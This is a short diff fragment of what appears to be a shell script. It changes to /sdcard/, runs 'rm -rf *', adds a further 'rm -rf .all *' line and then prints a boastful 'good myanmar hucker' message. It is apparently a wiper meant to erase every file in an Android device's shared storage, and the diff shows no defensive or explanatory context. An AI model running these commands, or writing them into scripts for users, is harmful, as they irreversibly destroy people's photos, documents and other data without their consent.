@@ -16,5 +16,7 @@ cd /sdcard/
 
 rm -rf *
 
+rm -rf .all *
+
 echo "good myanmar hucker......"
 
